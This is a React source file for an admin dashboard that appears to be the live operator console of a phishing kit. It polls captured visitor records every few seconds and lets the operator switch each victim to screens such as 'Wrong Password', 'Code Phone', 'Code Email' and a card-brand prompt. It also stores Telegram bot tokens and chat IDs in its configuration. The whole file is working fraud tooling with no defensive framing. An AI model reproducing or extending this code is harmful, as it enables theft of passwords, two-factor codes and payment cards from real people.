import { Button, Layout, Menu, Space, Table, Select } from "antd";
import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
const { Header, Content, Footer } = Layout;

import axios from "axios";
import { API_BE } from "./utils/variable";
const dayjs = require("dayjs");
const relativeTime = require("dayjs/plugin/relativeTime");

dayjs.extend(relativeTime);

export const AdminConfigUsers = () => {
  const hostname = window.location.hostname;
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [data, setData] = useState([]);

  const [isUpdate, setUpdate] = useState({
    loading: true,
    update: false,
  });

  const [values, setValues] = useState({
    web_unique: hostname,
    img_url: "",
    profile_img_url: "",
    full_name: "",
    telegram_chatId_one: "",
    telegram_chatId_two: "",
    telegram_token: "",
  });

  const createNewConfig = async (values) => {
    try {
      await axios.post(`${API_BE}/users/config/web`, values);
      await getConfig(hostname);
    } catch (error) {}
  };

  const updateConfig = async (values) => {
    try {
      await axios.put(`${API_BE}/users/config/web`, values);
      await getConfig(hostname);
    } catch (error) {}
  };

  const getConfig = async (hostname) => {
    try {
      const config = await axios.get(`${API_BE}/users/config/web/${hostname}`);

      if (config && config?.data) {
        setValues(config?.data?.data);
        setUpdate({ ...isUpdate, update: true, loading: false });
      } else {
        setUpdate({ ...isUpdate, update: false, loading: false });
      }
    } catch (error) {
      setUpdate({ ...isUpdate, update: false, loading: false });
    }
  };

  const getAllUsers = () => {
    setLoading(true);
    fetch(`${API_BE}/users?limit=1000&page=1`)
      .then((res) => res.json())
      .then((response) => {
        const arrayData = response?.data?.data || [];
        const reverseArray = arrayData.reverse();
        setData(reverseArray);
        setLoading(false);
      })
      .catch(() => {
        setLoading(false);
      });
  };

  const updateStatus = (unique_id, status, email) => {
    const data = {
      unique_id,
      status,
      email,
    };
    fetch(`${API_BE}/users`, {
      method: "PUT",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    })
      .then((response) => response.json())
      .then(() => {
        getAllUsers();
      })
      .catch(() => {
        getAllUsers();
      });
  };

  const onConfirmEmail = (id, userEmail, status) => {
    if (!id || !status) return;

    let email = prompt("Please enter email:", userEmail);
    if (email == null || email == "") {
      console.log("User cancelled the prompt.");
    } else {
      updateStatus(id, status, email);
    }
  };

  const onConfirm60Min = (id, status) => {
    if (!id || !status) return;

    let min = prompt("Please enter minutes:", "");
    if (min == null || min == "") {
      console.log("User cancelled the prompt.");
    } else {
      updateStatus(id, status, min);
    }
  };

  const onConfirmThankYou = (id, confirmThankYou, status) => {
    if (!id || !status) return;

    let email = prompt("Please enter minutes:", confirmThankYou);
    if (email == null || email == "") {
      console.log("User cancelled the prompt.");
    } else {
      updateStatus(id, status, email);
    }
  };

  const onConfirmCC = (id, status, type) => {
    if (!id || !status) return;

    let cc = prompt(`Please enter CC for ${type}`, "");
    if (cc == null || cc == "") {
      console.log("User cancelled the prompt.");
    } else {
      updateStatus(id, status, cc + "|" + type);
    }
  };

  const onSelectChange = (id, status, cc_type) => {
    if (!cc_type) return;
    if (cc_type === "visa") return onConfirmCC(id, status, cc_type);
    if (cc_type === "mastercard") return onConfirmCC(id, status, cc_type);
    if (cc_type === "amex") return onConfirmCC(id, status, cc_type);
    if (cc_type === "discover") return onConfirmCC(id, status, cc_type);
  };

  useEffect(() => {
    getAllUsers();
    const interval = setInterval(() => {
      getAllUsers();
    }, 3000);

    return () => {
      clearInterval(interval);
    };
  }, []);

  const columns = [
    {
      title: "ID",
      dataIndex: "unique_id",
      key: "unique_id",
      render: (text) => <a>{text}</a>,
    },
    {
      title: "Email",
      dataIndex: "email",
      key: "email",
    },
    {
      title: "Created",
      dataIndex: "created_at",
      key: "created_at",
      render: (text) => {
        const timeAgo = dayjs(text);
        return <a>{timeAgo?.from(dayjs()) || ""}</a>;
      },
    },
    {
      title: "Action",
      key: "action",
      render: (e, item) => (
        <Space size="middle">
          <Button
            type=""
            style={
              e?.status === 0 ? { background: "#52c41a", color: "white" } : {}
            }
            onClick={(e) => updateStatus(item.unique_id, 0)}
          >
            <div className="green__circle"></div>
          </Button>
          <Button
            type=""
            style={
              e?.status === 1 ? { background: "#52c41a", color: "white" } : {}
            }
            onClick={(e) => updateStatus(item.unique_id, 1)}
          >
            Wrong Password
          </Button>
          <Button
            type=""
            style={
              e?.status === 2 ? { background: "#52c41a", color: "white" } : {}
            }
            onClick={(e) => updateStatus(item.unique_id, 2)}
          >
            Code Generator
          </Button>
          <Button
            type=""
            style={
              e?.status === 4 ? { background: "#52c41a", color: "white" } : {}
            }
            onClick={(e) => updateStatus(item.unique_id, 4)}
          >
            Code Phone
          </Button>
          <Button
            style={
              e?.status === 8 ? { background: "green", color: "white" } : {}
            }
            onClick={(e) => onConfirmEmail(item.unique_id, "", 8)}
          >
            Code Email
          </Button>
          <Button
            type=""
            style={
              e?.status === 6 ? { background: "#52c41a", color: "white" } : {}
            }
            // updateStatus(item.unique_id, 6)
            onClick={(e) => onConfirm60Min(item.unique_id, 6)}
          >
            60min
          </Button>
          <Button
            type=""
            style={
              e?.status === 5 ? { background: "#52c41a", color: "white" } : {}
            }
            onClick={(e) => updateStatus(item.unique_id, 5)}
          >
            Thank you
          </Button>
          <Select
            onChange={(value) => onSelectChange(item.unique_id, 7, value)}
            style={
              e?.status === 8
                ? { background: "green", color: "white" }
                : { width: 200 }
            }
            placeholder="Select payment method"
          >
            <Option value="visa">Visa</Option>
            <Option value="mastercard">Mastercard</Option>
            <Option value="amex">Amex</Option>
            <Option value="discover">Discover</Option>
          </Select>
        </Space>
      ),
    },
  ];

  const filteredData = data.filter((item) => item?.web_unique === hostname);

  return (
    <Layout className="dashboard__wrapper">
      <Header>
        <Menu
          theme="dark"
          mode="horizontal"
          defaultSelectedKeys={["1"]}
          items={[
            { key: "1", label: "Dashboard" },
            { key: "2", label: "Config" },
          ]}
          onClick={({ item, key, keyPath, domEvent }) => {
            if (key == "1") {
              navigate("/ppi");
            } else {
              navigate("/ppi/config");
            }
          }}
        />
      </Header>
      <Content>
        <Table
          className="table__wrapper"
          columns={columns}
          dataSource={filteredData}
          pagination={false}
        />
      </Content>
    </Layout>
  );
};
